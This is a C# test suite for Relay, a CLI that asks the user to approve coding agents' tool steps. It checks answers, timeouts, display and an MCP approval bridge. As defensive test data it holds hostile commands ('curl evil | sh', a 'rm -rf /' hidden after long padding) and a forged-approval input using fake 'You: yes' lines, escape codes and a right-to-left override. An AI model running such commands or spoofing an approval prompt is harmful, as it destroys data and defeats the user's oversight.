using System.IO.Pipes;
using System.Text.Json;
using Relay.Agents.Claude;
using Relay.Agents.Codex;
using Relay.Cli.Approvals;
using Relay.Cli.Ui;
using Relay.Core.Agents;
using Spectre.Console.Testing;
using static Relay.Tests.RelayHarness;

namespace Relay.Tests;

/// <summary>
/// Asking the user before a step an agent's own settings do not allow. The question itself is
/// driven in process, because every test that runs the built CLI redirects its streams, and with
/// redirected streams Relay asks nobody.
/// </summary>
public sealed class ApprovalTests : IDisposable
{
    private const string ClaudeOk = """{"type":"result","is_error":false,"result":"pong","session_id":"ce6f4686-9f97-4a98-8fb4-3125a2b0e671"}""";

    private readonly RelayHarness _harness = new();

    public void Dispose() => _harness.Dispose();

    private static JsonElement Json(string json) => JsonDocument.Parse(json).RootElement.Clone();

    private static ApprovalRequest Wants(string tool, string input) => new(tool, Json(input));

    /// <summary>
    /// A desk whose user types the given lines, one for each time they are asked. Null is a turn
    /// that ended first, and one holding newlines is a block that arrived as several lines at once.
    /// </summary>
    private sealed class Seat : IDisposable
    {
        private readonly Queue<string?> _typed;

        public Seat(params string?[] typed)
        {
            _typed = new(typed);
            Desk = new ApprovalDesk(Console, new Lock(), () => Turn, _ => Read(), () => Events.Add("discarded what was typed before"));
        }

        public TestConsole Console { get; } = new();

        public ApprovalDesk Desk { get; }

        public AskingTurn? Turn { get; set; } = new("Claude", CancellationToken.None);

        /// <summary>What happened, in order: what was typed ahead being discarded, and each read of the keyboard with what was on screen by then.</summary>
        public List<string> Events { get; } = [];

        public int Reads => Events.Count(e => e.StartsWith("read", StringComparison.Ordinal));

        public string Output => Console.Output;

        public string Decide(ApprovalRequest request) => Desk.Decide(request, CancellationToken.None);

        public void Dispose() => Console.Dispose();

        private TypedInput? Read()
        {
            Events.Add($"read after: {Console.Output}");
            Assert.True(_typed.Count > 0, $"The user was asked more often than the test expected:\n{Console.Output}");
            return _typed.Dequeue() is { } line ? new TypedInput(line, line.Split('\n').Length) : null;
        }
    }

    private static (string Behavior, JsonElement Answer) Answer(string payload)
    {
        var answer = Json(payload);
        return (answer.GetProperty("behavior").GetString()!, answer);
    }

    [Fact]
    public void Yes_allows_the_step_exactly_as_it_was_asked()
    {
        using var seat = new Seat("yes");
        const string input = """{"command":"git push","description":"Publish the branch"}""";

        var (behavior, answer) = Answer(seat.Decide(Wants("PowerShell", input)));

        Assert.Equal("allow", behavior);
        Assert.Equal(Json(input).GetRawText(), answer.GetProperty("updatedInput").GetRawText());
        AssertShown("? Claude wants to use PowerShell:", seat.Output);
        AssertShown("command: git push", seat.Output);
    }

    [Theory]
    [InlineData("no")]
    [InlineData("n")]
    [InlineData("N")]
    public void No_refuses_the_step(string typed)
    {
        using var seat = new Seat(typed);

        var (behavior, answer) = Answer(seat.Decide(Wants("Write", """{"file_path":"a.txt","content":"hi"}""")));

        Assert.Equal("deny", behavior);
        Assert.Contains("said no", answer.GetProperty("message").GetString());
    }

    [Theory]
    [InlineData("")]
    [InlineData("ok")]
    [InlineData("yes please")]
    [InlineData("/go")]
    [InlineData("@codex carry on")]
    public void Nothing_but_a_plain_yes_allows_a_step(string typed)
    {
        // Asked again after the line that is not an answer, and the turn then ends with it unanswered.
        using var seat = new Seat(typed, null);

        var (behavior, _) = Answer(seat.Decide(Wants("Bash", """{"command":"rm -rf build"}""")));

        Assert.Equal("deny", behavior);
        Assert.Equal(2, seat.Reads);
    }

    [Fact]
    public void A_line_that_is_not_an_answer_is_said_not_to_have_gone_anywhere()
    {
        using var seat = new Seat("@codex carry on", "no");

        seat.Decide(Wants("Bash", """{"command":"ls"}"""));

        AssertShown("That was not sent to anyone.", seat.Output);
    }

    [Fact]
    public void What_was_typed_before_the_question_is_discarded_before_anything_is_read()
    {
        using var seat = new Seat("yes");

        seat.Decide(Wants("Bash", """{"command":"ls"}"""));

        Assert.Equal("discarded what was typed before", seat.Events[0]);
        // And the question was on screen before the answer was read.
        Assert.Contains("wants to use Bash", seat.Events[1]);
    }

    [Fact]
    public void With_approvals_off_a_step_is_refused_without_the_user_being_asked()
    {
        using var seat = new Seat();
        seat.Desk.Enabled = false;

        var (behavior, _) = Answer(seat.Decide(Wants("Bash", """{"command":"ls"}""")));

        Assert.Equal("deny", behavior);
        Assert.Equal(0, seat.Reads);
        AssertShown("! Bash was refused without asking you: approvals are off.", seat.Output);
    }

    [Fact]
    public void A_request_outside_any_agents_turn_is_refused_and_shows_nothing()
    {
        using var seat = new Seat();
        seat.Turn = null;

        var (behavior, _) = Answer(seat.Decide(Wants("Bash", """{"command":"ls"}""")));

        Assert.Equal("deny", behavior);
        Assert.Equal(0, seat.Reads);
        Assert.Empty(seat.Output);
    }

    [Fact]
    public void A_request_whose_asker_has_gone_is_refused_without_the_user_being_asked()
    {
        using var seat = new Seat();
        using var gone = new CancellationTokenSource();
        gone.Cancel();

        var (behavior, _) = Answer(seat.Desk.Decide(Wants("Bash", """{"command":"ls"}"""), gone.Token));

        Assert.Equal("deny", behavior);
        Assert.Equal(0, seat.Reads);
        Assert.Empty(seat.Output);
    }

    [Fact]
    public async Task A_request_that_waited_for_the_keyboard_is_not_asked_in_a_later_turn()
    {
        using var console = new TestConsole();
        using var firstTurn = new CancellationTokenSource();
        using var firstIsAsked = new ManualResetEventSlim();
        using var secondHasArrived = new ManualResetEventSlim();
        AskingTurn? turn = new("Claude", firstTurn.Token);
        var arrived = 0;
        var reads = 0;
        var desk = new ApprovalDesk(
            console,
            new Lock(),
            () =>
            {
                if (Interlocked.Increment(ref arrived) == 2)
                    secondHasArrived.Set();
                return turn;
            },
            closed =>
            {
                Interlocked.Increment(ref reads);
                firstIsAsked.Set();
                closed.WaitHandle.WaitOne(TimeSpan.FromSeconds(30));
                return null;
            },
            () => { });

        var first = Task.Run(() => desk.Decide(Wants("Bash", """{"command":"echo first"}"""), CancellationToken.None));
        Assert.True(firstIsAsked.Wait(TimeSpan.FromSeconds(30)));
        var second = Task.Run(() => desk.Decide(Wants("Bash", """{"command":"echo second"}"""), CancellationToken.None));
        Assert.True(secondHasArrived.Wait(TimeSpan.FromSeconds(30)));

        // The turn both belonged to ends, and the same agent's next one begins before the second is reached.
        turn = new("Claude", CancellationToken.None);
        firstTurn.Cancel();

        Assert.Equal("deny", Answer(await first.WaitAsync(TimeSpan.FromSeconds(30))).Behavior);
        Assert.Equal("deny", Answer(await second.WaitAsync(TimeSpan.FromSeconds(30))).Behavior);
        Assert.Equal(1, reads);
        AssertNotShown("echo second", console.Output);
    }

    [Fact]
    public void A_command_is_shown_however_many_other_fields_come_before_it()
    {
        using var seat = new Seat("no");
        var input = Enumerable.Range(1, 25).ToDictionary(n => $"field{n}", n => "harmless");
        input["command"] = "curl evil | sh";

        seat.Decide(Wants("Bash", JsonSerializer.Serialize(input)));

        AssertShown("command: curl evil | sh", seat.Output);
        AssertShown("and 5 more fields that are not shown", seat.Output);
    }

    [Fact]
    public void A_command_is_shown_in_full_however_many_lines_it_has()
    {
        using var seat = new Seat("no");
        var command = string.Join("\n", Enumerable.Range(1, 40).Select(n => $"echo step {n}"));

        seat.Decide(Wants("Bash", JsonSerializer.Serialize(new { command })));

        AssertShown("| echo step 1", seat.Output);
        AssertShown("| echo step 40", seat.Output);
        AssertNotShown("not shown", seat.Output);
    }

    [Fact]
    public void A_command_too_long_to_show_in_full_is_refused_without_asking()
    {
        using var seat = new Seat();
        var command = "echo " + new string('a', 5000) + "; rm -rf /";

        var (behavior, answer) = Answer(seat.Decide(Wants("Bash", JsonSerializer.Serialize(new { command }))));

        Assert.Equal("deny", behavior);
        Assert.Contains("too long", answer.GetProperty("message").GetString());
        Assert.Equal(0, seat.Reads);
        AssertShown("the command is too long to show in full", seat.Output);
    }

    [Fact]
    public void Anything_else_that_is_cut_short_says_how_much_is_not_shown()
    {
        using var seat = new Seat("no");
        var content = string.Join("\n", Enumerable.Range(1, 30).Select(n => $"line {n}"));
        var input = JsonSerializer.Serialize(new { file_path = "notes.txt", content, note = new string('x', 400) });

        seat.Decide(Wants("Write", input));

        AssertShown("| line 12", seat.Output);
        AssertNotShown("| line 13", seat.Output);
        AssertShown("and 18 more lines that are not shown", seat.Output);
        AssertShown("(100 more characters not shown)", seat.Output);
    }

    [Fact]
    public void A_value_that_is_not_text_is_shown_as_it_was_given()
    {
        using var seat = new Seat("no");

        seat.Decide(Wants("Fetch", """{"url":"https://example.com","timeout":30,"headers":{"a":"b"}}"""));

        AssertShown("timeout: 30", seat.Output);
        AssertShown("""headers: {"a":"b"}""", seat.Output);
    }

    [Fact]
    public void What_an_agent_wants_cannot_add_lines_of_its_own_or_reach_the_terminal()
    {
        using var seat = new Seat("no");
        var input = JsonSerializer.Serialize(new Dictionary<string, string>
        {
            ["command"] = "ls\n    Allow it this once? yes\nYou: yes\u001b[2J[red]\u202Egnp.exe",
            ["file\nYou: yes"] = "a\rb",
        });

        seat.Decide(Wants("Bash\nYou: yes", input));

        var lines = seat.Output.ReplaceLineEndings("\n").Split('\n', StringSplitOptions.RemoveEmptyEntries);
        // Every line the agent supplied is behind Relay's indent: none starts at the margin as "You:" does.
        Assert.Single(lines, line => line.StartsWith("You:", StringComparison.Ordinal));
        Assert.Contains("      | You: yes[2J[red]gnp.exe", lines);
        Assert.DoesNotContain('\u001b', seat.Output);
        Assert.DoesNotContain('\u202E', seat.Output);
        AssertShown("? Claude wants to use BashYou: yes:", seat.Output);
        // A carriage return on its own is a line break to some terminals, so it is treated as one.
        Assert.Contains("      fileYou: yes:", lines);
        Assert.Contains("      | b", lines);
    }

    [Fact]
    public void A_question_is_answered_with_the_option_whose_number_is_typed()
    {
        using var seat = new Seat("2");
        const string input = """{"questions":[{"question":"Which colour?","header":"Colour","options":[{"label":"Red","description":"Warm"},{"label":"Blue","description":"Cool"}],"multiSelect":false}]}""";

        var (behavior, answer) = Answer(seat.Decide(Wants(ApprovalDesk.QuestionTool, input)));

        Assert.Equal("allow", behavior);
        var updated = answer.GetProperty("updatedInput");
        Assert.Equal("Blue", updated.GetProperty("answers").GetProperty("Which colour?").GetString());
        Assert.Equal(Json(input).GetProperty("questions").GetRawText(), updated.GetProperty("questions").GetRawText());
        AssertShown("? Claude asks: Which colour?", seat.Output);
        AssertShown("2. Blue - Cool", seat.Output);
    }

    [Fact]
    public void Each_of_several_questions_is_asked_in_turn_and_takes_numbers_or_the_users_own_words()
    {
        using var seat = new Seat("1, 3", "", "whatever is fastest");
        const string input = """
            {"questions":[
              {"question":"Which parts?","options":[{"label":"Intro"},{"label":"Body"},{"label":"End"}],"multiSelect":true},
              {"question":"Which database?","options":[{"label":"SQLite"},{"label":"Postgres"}],"multiSelect":false}]}
            """;

        var (behavior, answer) = Answer(seat.Decide(Wants(ApprovalDesk.QuestionTool, input)));

        Assert.Equal("allow", behavior);
        var answers = answer.GetProperty("updatedInput").GetProperty("answers");
        Assert.Equal("Intro, End", answers.GetProperty("Which parts?").GetString());
        Assert.Equal("whatever is fastest", answers.GetProperty("Which database?").GetString());
        AssertShown("? Claude asks (1 of 2): Which parts?", seat.Output);
        AssertShown("? Claude asks (2 of 2): Which database?", seat.Output);
    }

    [Theory]
    [InlineData("1,2", false, "1,2")]
    [InlineData("5", false, "5")]
    [InlineData("0", true, "0")]
    [InlineData("2,2", true, "Blue")]
    [InlineData("2", false, "Blue")]
    public void Numbers_stand_for_options_only_when_every_one_of_them_is_an_option(string typed, bool multiple, string expected)
        => Assert.Equal(expected, ApprovalText.Choose(typed, [new("Red", null), new("Blue", null)], multiple));

    [Theory]
    [InlineData("/skip")]
    [InlineData(null)]
    public void A_question_can_be_left_unanswered(string? typed)
    {
        using var seat = new Seat(typed);

        var (behavior, answer) = Answer(seat.Decide(Wants(ApprovalDesk.QuestionTool, """{"questions":[{"question":"Which colour?","options":[{"label":"Red"},{"label":"Blue"}]}]}""")));

        Assert.Equal("deny", behavior);
        Assert.Contains("chose not to answer", answer.GetProperty("message").GetString());
    }

    [Fact]
    public void A_line_that_looks_like_a_command_is_never_taken_as_the_answer_to_a_question()
    {
        using var seat = new Seat("/go", "/skip");

        seat.Decide(Wants(ApprovalDesk.QuestionTool, """{"questions":[{"question":"Which colour?","options":[{"label":"Red"},{"label":"Blue"}]}]}"""));

        AssertShown("That is not an answer here", seat.Output);
        Assert.Equal(2, seat.Reads);
    }

    [Theory]
    [InlineData("""{}""")]
    [InlineData("""{"questions":[]}""")]
    [InlineData("""{"questions":"Which colour?"}""")]
    [InlineData("""{"questions":[{"options":[{"label":"Red"}]}]}""")]
    [InlineData("""{"questions":[{"question":"Which?","options":[{"description":"no label"}]}]}""")]
    [InlineData("""{"questions":[{"question":"Same?"},{"question":"Same?"}]}""")]
    public void A_question_relay_cannot_show_is_left_unanswered_without_asking(string input)
    {
        using var seat = new Seat();

        var (behavior, _) = Answer(seat.Decide(Wants(ApprovalDesk.QuestionTool, input)));

        Assert.Equal("deny", behavior);
        Assert.Equal(0, seat.Reads);
        AssertShown("asked something Relay could not show", seat.Output);
    }

    [Theory]
    [InlineData(false)]
    [InlineData(true)]
    public void Claude_is_told_where_to_ask_only_when_there_is_somebody_to_ask(bool trustWorkspace)
    {
        var provider = new ClaudeProvider(new FakeLocator("/usr/bin/claude"), new FakeProcessRunner(_ => Ok(ClaudeOk)));
        var tool = new ApprovalTool("/opt/relay/relay", ["approval-tool", "pipe"], _harness.Directory);

        var asking = provider.BuildArguments(sessionId: null, new("/work", trustWorkspace, tool));
        var silent = provider.BuildArguments(sessionId: null, new("/work", trustWorkspace));

        Assert.Equal([.. silent, "--mcp-config", _harness.PathTo("claude-mcp.json"), "--permission-prompt-tool", "mcp__relay_approval__ask"], asking);
        Assert.DoesNotContain(silent, argument => argument.Contains("permission", StringComparison.OrdinalIgnoreCase) || argument.Contains("mcp", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public async Task Claude_is_given_a_file_that_names_relays_own_tool_and_nothing_else()
    {
        var provider = new ClaudeProvider(new FakeLocator("/usr/bin/claude"), new FakeProcessRunner(_ => Ok(ClaudeOk)));
        var tool = new ApprovalTool(@"C:\Program Files\relay\relay.exe", ["approval-tool", "relay-approval-1"], _harness.Directory);

        await using var session = provider.CreateSession(await provider.DiscoverAsync(), new("/work", ApprovalTool: tool));

        var servers = Json(File.ReadAllText(_harness.PathTo("claude-mcp.json"))).GetProperty("mcpServers");
        var server = Assert.Single(servers.EnumerateObject());
        Assert.Equal("relay_approval", server.Name);
        Assert.Equal(@"C:\Program Files\relay\relay.exe", server.Value.GetProperty("command").GetString());
        Assert.Equal(["approval-tool", "relay-approval-1"], server.Value.GetProperty("args").EnumerateArray().Select(a => a.GetString()));
    }

    [Fact]
    public void An_agent_that_cannot_ask_is_run_as_before_and_is_not_said_to_ask()
    {
        var runner = new FakeProcessRunner(_ => Ok(ClaudeOk));
        var tool = new ApprovalTool("/opt/relay/relay", ["approval-tool", "pipe"], _harness.Directory);
        var codex = new CodexProvider(new FakeLocator("/usr/bin/codex"), runner);
        var claude = new ClaudeProvider(new FakeLocator("/usr/bin/claude"), runner);

        Assert.Equal(codex.BuildArguments(null, new("/work")), codex.BuildArguments(null, new("/work", ApprovalTool: tool)));
        Assert.False(codex.CanAskForApproval);
        Assert.True(claude.CanAskForApproval);
    }

    private static Relay.Agents.Processes.ProcessResult Ok(string stdout) => new(0, stdout, string.Empty);

    // The program an agent's CLI starts, run for real, talking to a Relay that answers as told.
    private async Task<(System.Diagnostics.Process Bridge, ApprovalServer Server)> StartBridgeAsync(Func<ApprovalRequest, CancellationToken, string> decide)
    {
        var server = new ApprovalServer(decide);
        server.Start();
        var bridge = _harness.Start(ApprovalBridge.Command, server.PipeName);
        await bridge.StandardInput.WriteLineAsync("""{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"test","version":"0"}}}""");
        await bridge.StandardInput.WriteLineAsync("""{"jsonrpc":"2.0","method":"notifications/initialized"}""");
        return (bridge, server);
    }

    private IReadOnlyList<JsonElement> Replies()
        => [.. _harness.Output.Split('\n', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries).Select(Json)];

    private async Task<JsonElement> ReplyToAsync(int id)
    {
        await Poll.UntilAsync(() => Replies().Any(r => r.GetProperty("id").GetInt32() == id), $"request {id} is answered");
        return Replies().Single(r => r.GetProperty("id").GetInt32() == id);
    }

    [Fact]
    public async Task The_program_an_agent_starts_passes_what_is_asked_to_relay_and_the_answer_back()
    {
        ApprovalRequest? asked = null;
        var (bridge, server) = await StartBridgeAsync((request, _) =>
        {
            asked = request;
            return """{"behavior":"allow","updatedInput":{"command":"git status"}}""";
        });
        await using var _ = server;

        await bridge.StandardInput.WriteLineAsync("""{"jsonrpc":"2.0","id":2,"method":"tools/list"}""");
        await bridge.StandardInput.WriteLineAsync("""{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"ask","arguments":{"tool_name":"Bash","input":{"command":"git status"},"tool_use_id":"toolu_1"}}}""");
        var called = await ReplyToAsync(3);

        Assert.Equal("2025-06-18", (await ReplyToAsync(1)).GetProperty("result").GetProperty("protocolVersion").GetString());
        Assert.Equal("ask", Assert.Single((await ReplyToAsync(2)).GetProperty("result").GetProperty("tools").EnumerateArray()).GetProperty("name").GetString());
        var content = Assert.Single(called.GetProperty("result").GetProperty("content").EnumerateArray());
        Assert.Equal("""{"behavior":"allow","updatedInput":{"command":"git status"}}""", content.GetProperty("text").GetString());
        Assert.Equal("Bash", asked!.ToolName);
        Assert.Equal("git status", asked.Input.GetProperty("command").GetString());

        // Closing its input is how the agent's CLI ends it, and nothing but the protocol was written.
        bridge.StandardInput.Close();
        await bridge.WaitForExitAsync().WaitAsync(TimeSpan.FromSeconds(30));
        Assert.Equal(0, bridge.ExitCode);
        Assert.Equal(3, Replies().Count);
    }

    [Fact]
    public async Task The_program_an_agent_starts_still_answers_while_the_user_is_deciding()
    {
        using var decided = new ManualResetEventSlim();
        var (bridge, server) = await StartBridgeAsync((_, _) =>
        {
            decided.Wait(TimeSpan.FromSeconds(30));
            return ApprovalBridge.Refusal("no");
        });
        await using var _ = server;

        await bridge.StandardInput.WriteLineAsync("""{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"ask","arguments":{"tool_name":"Bash","input":{}}}}""");
        await bridge.StandardInput.WriteLineAsync("""{"jsonrpc":"2.0","id":3,"method":"ping"}""");
        await bridge.StandardInput.WriteLineAsync("""{"jsonrpc":"2.0","id":4,"method":"resources/list"}""");

        Assert.Equal(JsonValueKind.Object, (await ReplyToAsync(3)).GetProperty("result").ValueKind);
        Assert.Equal(-32601, (await ReplyToAsync(4)).GetProperty("error").GetProperty("code").GetInt32());
        Assert.DoesNotContain(Replies(), r => r.GetProperty("id").GetInt32() == 2);

        decided.Set();
        await ReplyToAsync(2);
    }

    [Fact]
    public async Task A_call_the_agents_cli_withdraws_stops_the_user_being_asked_and_is_not_answered()
    {
        using var asked = new ManualResetEventSlim();
        using var withdrawn = new ManualResetEventSlim();
        var (bridge, server) = await StartBridgeAsync((_, gone) =>
        {
            asked.Set();
            if (gone.WaitHandle.WaitOne(TimeSpan.FromSeconds(30)))
                withdrawn.Set();
            return ApprovalBridge.Refusal("no");
        });
        await using var _ = server;

        await bridge.StandardInput.WriteLineAsync("""{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"ask","arguments":{"tool_name":"Bash","input":{}}}}""");
        Assert.True(asked.Wait(TimeSpan.FromSeconds(30)));
        await bridge.StandardInput.WriteLineAsync("""{"jsonrpc":"2.0","method":"notifications/cancelled","params":{"requestId":2,"reason":"timed out"}}""");

        Assert.True(withdrawn.Wait(TimeSpan.FromSeconds(30)), "Relay was not told that the call had been withdrawn.");
        await bridge.StandardInput.WriteLineAsync("""{"jsonrpc":"2.0","id":3,"method":"ping"}""");
        await ReplyToAsync(3);
        Assert.DoesNotContain(Replies(), r => r.GetProperty("id").GetInt32() == 2);
    }

    [Fact]
    public async Task A_request_whose_asker_closes_the_pipe_stops_the_user_being_asked()
    {
        using var asked = new ManualResetEventSlim();
        using var gone = new ManualResetEventSlim();
        await using var server = new ApprovalServer((_, askerGone) =>
        {
            asked.Set();
            if (askerGone.WaitHandle.WaitOne(TimeSpan.FromSeconds(30)))
                gone.Set();
            return ApprovalBridge.Refusal("no");
        });
        server.Start();

        await using (var pipe = new NamedPipeClientStream(".", server.PipeName, PipeDirection.InOut, PipeOptions.Asynchronous))
        {
            await pipe.ConnectAsync(TimeSpan.FromSeconds(10), CancellationToken.None);
            await using var writer = new StreamWriter(pipe, leaveOpen: true) { AutoFlush = true };
            await writer.WriteLineAsync("""{"tool_name":"Bash","input":{"command":"ls"}}""");
            Assert.True(asked.Wait(TimeSpan.FromSeconds(30)));
        }

        Assert.True(gone.Wait(TimeSpan.FromSeconds(30)), "The question stayed open after its asker had gone.");
    }

    [Fact]
    public async Task A_pipe_that_could_not_be_opened_for_the_next_request_is_opened_again()
    {
        var opened = 0;
        await using var server = new ApprovalServer(
            (_, _) => ApprovalBridge.Refusal("no"),
            name => Interlocked.Increment(ref opened) == 2 ? throw new IOException("All pipe instances are busy.") : ApprovalServer.OpenPipe(name));
        server.Start();

        async Task<string?> AskAsync()
        {
            await using var pipe = new NamedPipeClientStream(".", server.PipeName, PipeDirection.InOut, PipeOptions.Asynchronous);
            await pipe.ConnectAsync(TimeSpan.FromSeconds(20), CancellationToken.None);
            await using var writer = new StreamWriter(pipe, leaveOpen: true) { AutoFlush = true };
            using var reader = new StreamReader(pipe, leaveOpen: true);
            await writer.WriteLineAsync("""{"tool_name":"Bash","input":{"command":"ls"}}""");
            return Json((await reader.ReadLineAsync())!).GetProperty("behavior").GetString();
        }

        Assert.Equal("deny", await AskAsync());
        // Until it is open again nobody is listening. On macOS and Linux a request made in that
        // gap connects all the same and is then dropped, which the approval tool answers with a no.
        await Poll.UntilAsync(() => Volatile.Read(ref opened) >= 3, "the pipe that could not be opened is opened again");
        Assert.Equal("deny", await AskAsync());
    }

    [Fact]
    public async Task With_no_relay_to_ask_the_answer_is_no()
    {
        var bridge = _harness.Start(ApprovalBridge.Command, $"relay-{Guid.NewGuid():N}"[..22]);

        await bridge.StandardInput.WriteLineAsync("""{"jsonrpc":"2.0","id":7,"method":"tools/call","params":{"name":"ask","arguments":{"tool_name":"Bash","input":{"command":"ls"}}}}""");
        var content = Assert.Single((await ReplyToAsync(7)).GetProperty("result").GetProperty("content").EnumerateArray());

        Assert.Equal("deny", Json(content.GetProperty("text").GetString()!).GetProperty("behavior").GetString());
    }

    [Fact]
    public async Task The_pipes_name_is_short_enough_to_be_a_socket_in_a_long_temporary_folder()
    {
        await using var server = new ApprovalServer((_, _) => "unreachable");

        // macOS allows a socket's path 104 characters, and its temporary folder alone takes about 50.
        Assert.True($"CoreFxPipe_{server.PipeName}".Length <= 33, server.PipeName);
        Assert.NotEqual(server.PipeName, new ApprovalServer((_, _) => "unreachable").PipeName);
    }

    [Theory]
    [InlineData("not json")]
    [InlineData("""{"tool_name":"Bash"}""")]
    [InlineData("""{"tool_name":7,"input":{}}""")]
    [InlineData("""{"tool_name":"Bash","input":"ls"}""")]
    public async Task A_request_relay_cannot_read_is_refused_and_never_put_to_the_user(string line)
    {
        var asked = false;
        await using var server = new ApprovalServer((_, _) =>
        {
            asked = true;
            return "unreachable";
        });
        server.Start();

        await using var pipe = new NamedPipeClientStream(".", server.PipeName, PipeDirection.InOut, PipeOptions.Asynchronous);
        await pipe.ConnectAsync(TimeSpan.FromSeconds(10), CancellationToken.None);
        await using var writer = new StreamWriter(pipe, leaveOpen: true) { AutoFlush = true };
        using var reader = new StreamReader(pipe, leaveOpen: true);
        await writer.WriteLineAsync(line);

        Assert.Equal("deny", Json((await reader.ReadLineAsync())!).GetProperty("behavior").GetString());
        Assert.False(asked);
    }

    [Fact]
    public async Task Without_a_terminal_nobody_is_asked_and_claude_is_run_as_before()
    {
        _harness.InstallAgent("claude", ClaudeReply("pong"));

        var output = await _harness.ChatAsync(["start"], "/approvals", "/approvals on", "@claude hi", "/exit");

        AssertShown("Approvals are not available: Relay asks you only when it is run in a terminal", output);
        AssertShown("Claude: pong", output);
        var arguments = Assert.Single(_harness.Invocations("claude"));
        Assert.DoesNotContain("permission", arguments);
        Assert.DoesNotContain("mcp", arguments);
    }
}
